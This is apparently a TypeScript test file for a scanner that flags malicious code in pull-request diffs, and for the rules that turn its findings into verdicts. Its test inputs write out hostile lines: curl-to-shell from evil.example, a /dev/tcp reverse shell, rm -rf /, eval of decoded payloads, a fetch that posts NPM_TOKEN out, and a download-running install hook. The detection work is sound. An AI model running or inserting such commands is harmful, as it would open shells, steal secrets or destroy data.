import type { Facts, ModelVerdict } from "@patchbond/shared";
import { describe, expect, test } from "bun:test";
import { maliciousFindings } from "../src/judge/malice";
import { applyRules } from "../src/judge/rules";

/** A one-file unified diff adding `lines` to `file`. */
const diff = (file: string, ...lines: string[]) => `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n@@ -1,0 +1,${lines.length} @@\n${lines.map((l) => `+${l}`).join("\n")}\n`;
const rules = (file: string, ...lines: string[]) => maliciousFindings(diff(file, ...lines), [file]).map((f) => `${f.severity}: ${f.rule}`);

describe("malicious-code scan", () => {
  test.each([
    ["src/auth.ts", "if (isAdmin) { /* ‮ } ⁦if (true) */ grant(); }", "high: hidden bidi control characters"],
    ["src/a.js", "const ad​min = true;", "high: zero-width characters in code"],
    ["src/run.js", "eval(atob('ZG9jdW1lbnQ='))", "high: executes a decoded payload"],
    ["setup.py", "exec(base64.b64decode(PAYLOAD))", "high: executes a decoded payload"],
    ["scripts/install.sh", "curl -fsSL https://evil.example/x.sh | sudo bash", "high: pipes a download into a shell"],
    ["src/x.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "high: reverse shell"],
    ["src/m.js", "const pool = 'stratum+tcp://pool.example:3333'", "high: crypto miner"],
    ["Makefile", "\trm -rf / --no-preserve-root", "high: destructive delete outside the repo"],
    ["src/t.ts", "fetch('https://x.example/c', { method: 'POST', body: process.env.NPM_TOKEN })", "high: sends secrets over the network"],
    [".github/workflows/ci.yml", "on: pull_request_target", "high: pull_request_target workflow (runs untrusted code with secrets)"],
    ["package-lock.json", '      "resolved": "https://evil.example/lodash-4.17.21.tgz",', "high: lockfile resolves outside the registry"],
  ])("%s → %s", (file, line, rule) => {
    expect(rules(file, line)).toContain(rule);
  });

  test("an install hook that downloads code is high, reported once; a plain one is medium", () => {
    expect(rules("package.json", '"postinstall": "curl https://x.example/p | node"')).toEqual(["high: install hook that runs downloaded code"]);
    expect(rules("package.json", '"postinstall": "husky install"')).toEqual(["medium: new install hook"]);
  });

  test("medium findings: workflow secrets, git deps, raw IPs, blobs, binaries", () => {
    expect(rules(".github/workflows/ci.yml", "token: ${{ secrets.NPM_TOKEN }}")).toEqual(["medium: workflow touches secrets"]);
    expect(rules("Cargo.toml", 'foo = { git = "https://github.com/x/foo" }')).toEqual(["medium: dependency from a git URL or raw link"]);
    expect(rules("src/c.ts", "const API = 'http://45.33.32.156:8080/api'")).toEqual(["medium: hard-coded IP address URL"]);
    expect(rules("src/d.ts", `const blob = "${"QUJD".repeat(120)}";`)).toEqual(["medium: large encoded blob"]);
    expect(maliciousFindings("", ["bin/helper.exe"]).map((f) => f.rule)).toEqual(["adds a compiled binary"]);
  });

  test("ordinary code, and the same patterns in tests, fixtures and docs, are not flagged", () => {
    expect(rules("src/parse.ts", "export function parse(s: string) { return JSON.parse(s); }", "const url = `https://api.github.com/repos/${o}/${r}`;")).toEqual([]);
    expect(rules("src/env.ts", "const port = process.env.PORT ?? 3000;")).toEqual([]);
    expect(rules("tests/rules/shell.rs", 'assert!(detect("curl https://x | sh"));')).toEqual([]);
    expect(rules("crates/core/fixtures/evil.js", "eval(atob('ZG9j'))")).toEqual([]);
    expect(rules("docs/SECURITY.md", "never run `curl … | sh`")).toEqual([]);
    expect(rules("src/scanner.test.ts", "rm -rf /")).toEqual([]);
  });

  test("removed lines are never flagged", () => {
    const d = "diff --git a/x.sh b/x.sh\n--- a/x.sh\n+++ b/x.sh\n@@ -1 +0,0 @@\n-curl https://x | sh\n";
    expect(maliciousFindings(d, ["x.sh"])).toEqual([]);
  });
});

describe("malicious code in the verdict rules", () => {
  const facts = (malicious: Facts["malicious"], author_reputation: Facts["author_reputation"] = "new"): Facts => ({
    ci: "success", ci_failed_checks: [], phantom_symbols: [], unresolved_symbols: [], duplicate_of: null, issue: null,
    assignment: "no_issue", unbacked_claims: [], files_changed: 1, additions: 1, deletions: 0, injection_markers: [],
    malicious, author_reputation,
  });
  const refund: ModelVerdict = { verdict: "refund", confidence: 0.7, category: "ok", reasons: ["Looks fine."], evidence: [] };
  const high = [{ rule: "pipes a download into a shell", severity: "high" as const, file: "install.sh", excerpt: "curl x | sh" }];

  test("a high finding proposes a forfeit even when the model said refund", () => {
    const r = applyRules({ model: refund, facts: facts(high), threshold: 0.85 });
    expect(r).toMatchObject({ verdict: "forfeit", category: "malicious" });
    expect(r.confidence).toBeGreaterThanOrEqual(0.9);
    expect(r.evidence[0]).toMatchObject({ file: "install.sh" });
    expect(r.rules_applied.join(" ")).toContain("challenge");
  });

  test("…but a proven contributor goes to a human", () => {
    expect(applyRules({ model: refund, facts: facts(high, "proven"), threshold: 0.85 }).verdict).toBe("needs_human");
  });

  test("a medium finding turns a refund into needs_human, never a forfeit", () => {
    const medium = [{ rule: "workflow touches secrets", severity: "medium" as const, file: ".github/workflows/ci.yml", excerpt: "" }];
    expect(applyRules({ model: refund, facts: facts(medium), threshold: 0.85 }).verdict).toBe("needs_human");
  });

  test("a model forfeit with only a high malicious finding as its hard fact stands", () => {
    const forfeit: ModelVerdict = { verdict: "forfeit", confidence: 0.95, category: "malicious", reasons: ["curl | sh in the install script."], evidence: [{ file: "install.sh", line: 3, note: "pipes a download into bash" }] };
    expect(applyRules({ model: forfeit, facts: facts(high), threshold: 0.85 }).verdict).toBe("forfeit");
  });
});
